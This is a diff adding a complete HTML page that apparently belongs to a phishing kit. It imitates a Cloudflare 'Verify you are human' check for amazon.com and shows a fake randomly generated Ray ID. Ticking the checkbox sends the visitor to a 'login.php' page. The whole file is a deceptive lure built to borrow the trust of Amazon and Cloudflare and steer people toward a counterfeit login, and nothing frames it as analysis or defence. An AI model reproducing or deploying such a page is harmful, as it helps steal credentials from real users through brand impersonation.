@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en-US">
+ <head>
+  <title>
+   Human Verification
+  </title>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <style>
+   body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            text-align: center;
+        }
+
+        .container {
+            margin-top: 50px;
+        }
+
+        .logo {
+            max-width: 200px;
+            margin-bottom: 20px;
+        }
+
+        .message {
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-label {
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+
+        .checkbox {
+            vertical-align: middle;
+        }
+
+        .loading {
+            display: none;
+            margin-top: 20px;
+            animation: loading 1.5s infinite;
+        }
+
+        @keyframes loading {
+            0% {
+                content: ".";
+            }
+            33% {
+                content: "..";
+            }
+            66% {
+                content: "...";
+            }
+            100% {
+                content: ".";
+            }
+        }
+
+        .additional-info {
+            font-size: 14px;
+            margin-top: 20px;
+        }
+  </style>
+ </head>
+ <body>
+  <div class="container">
+   <img alt="Logo" class="logo" src="logo.jpg"/>
+   <div class="message">
+    amazon.com
+   </div>
+   <div class="message">
+    Checking if the site connection is secure
+   </div>
+   <div class="message">
+    Verify you are human
+   </div>
+   <label class="checkbox-label">
+    <input class="checkbox" onchange="handleCheckboxChange()" type="checkbox"/>
+    I'm not a robot
+   </label>
+   <div class="loading">
+   </div>
+   <div class="additional-info">
+    Ray ID:
+    <span id="ray-id">
+    </span>
+   </div>
+   <div class="additional-info">
+    Performance &amp; security by Cloudflare
+   </div>
+  </div>
+  <script>
+   function handleCheckboxChange() {
+            var checkbox = document.querySelector('.checkbox');
+            var loading = document.querySelector('.loading');
+            var rayId = document.querySelector('#ray-id');
+
+            if (checkbox.checked) {
+                loading.style.display = 'block';
+                rayId.innerText = generateRandomString(15);
+                setTimeout(redirect, 2000);
+            }
+        }
+
+        function redirect() {
+            window.location.href = 'login.php';
+        }
+
+        function generateRandomString(length) {
+            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var result = '';
+            for (var i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+  </script>
+ </body>
+</html>
